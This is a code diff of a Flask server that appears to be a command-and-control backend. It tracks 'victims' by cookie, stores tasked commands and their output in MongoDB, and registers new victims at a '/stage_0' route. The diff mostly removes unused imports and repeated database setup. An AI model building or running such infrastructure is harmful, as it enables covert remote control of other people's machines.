@@ -1,14 +1,8 @@
 from flask import Flask,request
-from pathlib import Path
 import  os
-import pymongo
-import logging
-import pdb
 import base64
 from lib.logger import Logger
 from termcolor import colored
-import pdb
-import time
 import sys
 
 
@@ -28,13 +22,6 @@ def main(mongoclient,server_logger,port):
 		return request.form.to_dict()
 
 
-	## Insert the command output in the Database
-	def insert_cmd_output(output,victim_id,task_id):
-		mydb = myclient[os.environ['MONGODB_DATABASE']]
-		cmds = mydb["commands"]
-		h = {'victim_id':victim_id,'task_id':task_id}
-		cmds.find_one_and_update(h,{ "$set": { "output": output } })
-
 
 	## Checks if we are running on docker container
 	def docker():
@@ -44,10 +31,7 @@ def main(mongoclient,server_logger,port):
 
 	@app.route('/',methods = ['GET', 'POST'])
 	def run():
-		myclient = mongoclient
 		if request.method == 'GET':
-			mydb = myclient[os.environ['MONGODB_DATABASE']]
-			cmds = mydb["commands"]
 			
 			victim_id = get_cookie(request)
 
@@ -119,12 +103,6 @@ def main(mongoclient,server_logger,port):
 	@app.route('/stage_0',methods = ['POST'])
 	def stage():
 		if request.method == 'POST':
-			myclient = mongoclient
-
-			mydb = myclient[os.environ['MONGODB_DATABASE']]
-			cmds = mydb["commands"]
-			victims = mydb['victims']
-
 
 			## Get the victim id of the new victim
 			victim_id = get_cookie(request)
